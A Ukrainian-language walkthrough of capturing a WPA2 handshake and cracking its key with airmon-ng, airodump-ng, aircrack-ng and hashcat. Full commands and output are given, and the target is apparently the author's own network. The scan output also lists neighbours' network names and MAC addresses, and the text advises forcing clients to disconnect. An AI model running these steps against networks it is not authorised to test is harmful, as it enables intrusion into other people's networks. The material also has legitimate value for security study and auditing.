### 1 - Перейти в режим моніторингу

1. Отримати інтерфейси: ```iwconfig```

```┌──(kali㉿kali)-[~]
└─$ iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11AC  ESSID:"(Приховано мною)"  Nickname:"WIFI@RTL8821AU"
          Mode:Managed  Frequency:5.2 GHz  Access Point: 60:32:B1:FF:8B:26   
          Bit Rate:434 Mb/s   Sensitivity:0/0  
          Retry:off   RTS thr:off   Fragment thr:off
          Power Management:off
          Link Quality=51/100  Signal level=81/100  Noise level=0/100
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0

wlan1     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=15 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
```

2. Запустити бажаний інтерфейс в режим моніторингу

```
sudo airmon-ng check kill
sudo airmon-ng start wlan1
```

2.1 ```sudo airmon-ng stop wlan0``` - Якщо запустили монітор не там, де треба

### 2 - Сніфінг через airodump

1. Запустити дамп з монітору

```sudo airodump-ng wlan1mon```

``` CH  3 ][ Elapsed: 36 s ][ 2024-10-27 12:20 ][ paused output                                   
                                                                                               
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID               
                                                                                               
 64:64:4A:DD:21:68  -82        1        2    0  11  130   WPA2 CCMP   PSK  Xiaomi_2167         
 8C:53:C3:39:7D:8C  -79        4        0    0   2  130   WPA2 CCMP   PSK  Rusanovka-net 156   
 B0:4E:26:C4:BF:A1  -79        2        0    0   2  130   WPA2 CCMP   PSK  YakovenkoFamily     
 98:DE:D0:90:20:5C  -81        2        0    0   3  270   WPA2 CCMP   PSK  Shamo 4             
 7C:8B:CA:4F:8C:04   -1        0        2    0   3   -1   WPA              <length:  0>        
 C8:13:8B:74:AF:F1  -79        2        0    0   7  130   WPA2 CCMP   PSK  LANTUS              
 10:FE:ED:87:12:C8  -81        2        0    0   1  270   WPA2 CCMP   PSK  Lgita2018           
 E4:C3:2A:37:5B:C1  -80       22        0    0   3  270   WPA2 CCMP   PSK  TP-Link_5BC1        
 F4:F2:6D:3E:84:B4  -82        9        0    0  10  405   WPA2 CCMP   PSK  S J Bond            
 1C:3B:F3:79:EF:9F  -80       10        0    0   3  270   WPA2 CCMP   PSK  Rusanovka_ef9f      
 0C:B6:D2:21:54:05  -82       22        0    0  13  270   WPA2 CCMP   PSK  LL_Home             
 C0:C9:E3:6A:5D:D0  -78       11        0    0   7  405   WPA2 CCMP   PSK  Rusanovka_5dd0      
 F2:77:59:23:AF:91  -74       20        0    0   6  360   WPA2 CCMP   PSK  SL-Lokkie           
 82:15:A2:45:5A:59  -75       34        3    0  11  130   WPA2 CCMP   PSK  <length: 30>        
 00:EB:D8:FD:79:3A  -79        3        0    0   4  270   WPA2 CCMP   PSK  MERCUSYS_793A       
 00:31:92:79:94:B5  -76       26        0    0   4  195   WPA2 CCMP   PSK  TP-Link_94B5        
 B0:A7:B9:01:F9:F3  -74       18        7    0   3  130   WPA2 CCMP   PSK  Kalistov House      
 82:B0:24:DA:55:C9  -76       35        1    0   3  130   WPA2 CCMP   PSK  <length: 30>        
 50:0F:F5:84:DE:88  -79       20        0    0   2  130   WPA2 CCMP   PSK  Tenda_GUNG          
 82:15:A2:45:5A:58  -74       40        1    0  11  130   WPA2 CCMP   PSK  NAS186              
 26:CF:24:F4:B2:03  -81        9        0    0  11  270   OPN              <length:  0>        
 E8:8D:28:61:41:5B  -77       28        0    0  11  195   WPA2 CCMP   PSK  MadMax2             
 00:31:92:85:8C:27  -82        8        0    0  11  270   WPA2 CCMP   PSK  Home-121            
 7A:8C:B5:2B:9D:B9  -57       52        0    0   5  360   WPA2 CCMP   PSK  <length:  0>        
 E4:BE:ED:68:DA:B4  -74      118        0    0   5  135   WPA2 CCMP   PSK  Varya               
 FA:5E:3C:18:70:2A  -79       18        1    0  10  130   WPA2 CCMP   PSK  E71R193v            
 CA:25:4A:33:91:5A  -69       62        0    0  10  130   WPA2 CCMP   PSK  <length:  0>        
 FE:5E:3C:18:70:2A  -79       18        0    0  10  130   WPA2 CCMP   PSK  E71R193g            
 78:8C:B5:0B:9D:B9  -56       55        1    0   5  360   WPA2 CCMP   PSK  TP-Link_9DB9        
 06:31:92:79:94:B5  -77       24        0    0   4  195   WPA2 CCMP   PSK  <length:  0>        
 C8:3A:35:0E:B6:B8  -79       45        0    0   9  135   WPA2 CCMP   PSK  108                 
 B0:BE:76:18:CE:FA  -80        3        0    0   3  405   WPA2 CCMP   PSK  TP-Link_CEFA        
 B4:B0:24:DA:55:C7  -74       32        2    0   3  130   WPA2 CCMP   PSK  Rusanovka4852       
 60:32:B1:FF:8B:27  -72       82       19    0   2  405   WPA2 CCMP   PSK  (Приховано мною)               
 60:83:E7:CB:9A:1D  -22       75        1    0  11   65   WPA2 CCMP   PSK  dkucheruk           
 66:32:B1:FF:8B:27  -27       92        0    0   2  405   WPA2 CCMP   PSK  <length:  0>       
 D4:5D:64:DF:B1:70  -79       21        0    0  13  130   WPA2 CCMP   PSK  Danya              
 B4:0F:3B:16:2C:84  -76       29        0    0  13  130   WPA2 CCMP   PSK  Olena
```

2. Скопіювати BSSID необхідної мережі:

*60:83:E7:CB:9A:1D  -22       75        1    0  11   65   WPA2 CCMP   PSK  dkucheruk*

-> ```60:83:E7:CB:9A:1D```

3. Створити dump.cap з хендшейком

```sudo airodump-ng wlan1mon --bssid 60:83:E7:CB:9A:1D -c 11 -w dump```

4. Щоб отримати хендшейк, потрібно, щоб клієнти мережі підключились/відключились. Зачекайте або відключіть клієнтів самостійно. Airodump повідомить, коли хендшейк буде знайдено.

### 3 - Підбір ключа

1. Створити умовний словник паролів в якому зберігається правильний ключ.

```nano wordlist.txt```

2. Підібрати пароль через "словник".

```aircrack-ng dump-01.cap -w wordlist.txt```
```
┌──(kali㉿kali)-[~]
└─$ aircrack-ng dump-02.cap -w wordlist.txt                         
Reading packets, please wait...
Opening dump-02.cap
Read 3874 packets.

   #  BSSID              ESSID                     Encryption

   1  60:83:E7:CB:9A:1D  dkucheruk                 WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening dump-02.cap
Read 3874 packets.

1 potential targets


                               Aircrack-ng 1.7 

      [00:00:00] 2/2 keys tested (27.73 k/s) 

      Time left: --

                        KEY FOUND! [ (Приховано мною з причин конфіденційності) ]


      Master Key     : 42 C2 81 A0 D8 44 8D 9F EA 9F (Видалив частину)
                     

      Transient Key  : FC B4 F7 A6 03 A2 
                       
                       1F BC 7B 50 E6 7F 2B F7 96 51 6A A7 4C DF  (Видалив частину)
                       

      EAPOL HMAC     : 23 EC 06 B1 B5 C8 (Видалив частину)

```

### 3.1 - Підбір ключа (Hashcat)

1. Використовуйте wpaclean для очищення захопленого файлу:

```wpaclean clean.cap dump-02.cap```

2. Потім конвертуйте його в формат для Hashcat:

```hcxpcapngtool -o handshake.hccapx clean.cap```

3. Підбір ключа з Hashcat

```hashcat -m 22000 handshake.hccapx wordlist.txt```

```┌──(kali㉿kali)-[~]
└─$ hashcat -m 22000 handshake.hccapx wordlist.txt
hashcat (v6.2.6) starting

/sys/class/hwmon/hwmon4/temp1_input: No such file or directory

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-penryn-Intel(R) Core(TM) i5 CPU       M 520  @ 2.40GHz, 2754/5573 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: wordlist.txt
* Passwords.: 2
* Bytes.....: 17
* Keyspace..: 2
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

2037925397cae32c55bd03ec06b1b5c8:6083e7cb9a1d:c6c2b497b5a7:dkucheruk:(Приховано мною)
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: handshake.hccapx
Time.Started.....: Sun Oct 27 12:56:22 2024 (1 sec)
Time.Estimated...: Sun Oct 27 12:56:23 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        1 H/s (0.11ms) @ Accel:256 Loops:64 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2/2 (100.00%)
Rejected.........: 1/2 (50.00%)
Restore.Point....: 0/2 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: (Приховано мною) -> (Приховано мною)
Hardware.Mon.#1..: Util: 25%

Started: Sun Oct 27 12:54:28 2024
Stopped: Sun Oct 27 12:56:25 2024
```
